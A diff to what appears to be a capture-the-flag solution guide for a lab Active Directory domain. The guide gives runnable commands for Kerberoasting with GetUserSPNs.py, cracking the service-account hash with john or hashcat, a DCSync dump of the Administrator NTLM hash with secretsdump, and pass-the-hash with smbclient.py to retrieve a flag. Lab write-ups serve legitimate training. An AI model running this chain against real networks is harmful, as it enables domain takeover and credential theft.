@@ -199,12 +199,20 @@ PY
    ```
    GetUserSPNs.py "BOREAS.LOCAL/d.kowalski:P@ssw0rd123" -dc-ip dc01.boreas.local -request
    ```
-2. You get a Kerberos TGS hash for `svc-backup` (and `svc-scada`).
-3. Crack the `svc-backup` hash with hashcat or john:
+2. You get a Kerberos TGS hash for `svc-backup` (and `svc-scada`). Save the `svc-backup` line to a file:
    ```
-   hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+   GetUserSPNs.py "BOREAS.LOCAL/d.kowalski:P@ssw0rd123" -dc-ip dc01.boreas.local -request \
+     | grep '^\$krb5tgs.*svc-backup' > backup.hash
    ```
-   Password is `Password1` — cracks in seconds.
+3. Crack the `svc-backup` hash. **Use john** — the a14-kali container ships without an OpenCL/CUDA runtime, so `hashcat` errors out with "you are probably missing the OpenCL, CUDA or HIP runtime installation." `john --format=krb5tgs` works out of the box on CPU. Decompress rockyou first if needed:
+   ```
+   gunzip -k /usr/share/wordlists/rockyou.txt.gz   # leaves rockyou.txt in place
+   john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
+   john --show --format=krb5tgs backup.hash
+   ```
+   Password is `Password1` — cracks in under a second.
+
+   *(If you happen to be on a host with a GPU runtime, `hashcat -m 13100 backup.hash /usr/share/wordlists/rockyou.txt` is faster, but it's not the default in this container.)*
 4. `svc-backup` has misconfigured **DCSync rights** (Replicating Directory Changes). Use secretsdump:
    ```
    secretsdump.py "BOREAS.LOCAL/svc-backup:Password1@dc01.boreas.local" -just-dc-user Administrator
@@ -212,15 +220,21 @@ PY
 5. You get the Administrator NTLM hash (the second hex half of
    `Administrator:500:aad3b435b51404eeaad3b435b51404ee:<nt-hash>:::`).
    Administrator's cleartext password is random — use pass-the-hash via
-   impacket's smbclient.py:
+   impacket's smbclient.py. Pipe the commands in (heredoc through CMDS),
+   and `get flag.txt` saves to the current local directory by default —
+   no second path argument needed (a path argument with backslashes
+   gets parsed as part of the share path on some impacket versions and
+   fails with "No such file or directory: 'flag.txt \\tmp\\flag17.txt'"):
    ```
    /opt/tools/bin/smbclient.py \
        -hashes aad3b435b51404eeaad3b435b51404ee:<nt-hash-from-secretsdump> \
        BOREAS.LOCAL/Administrator@dc01.boreas.local <<'CMDS'
    use admin_flag
+   lcd /tmp
    get flag.txt
    exit
    CMDS
+   cat /tmp/flag.txt
    ```
 6. The flag is in `flag.txt`.
 
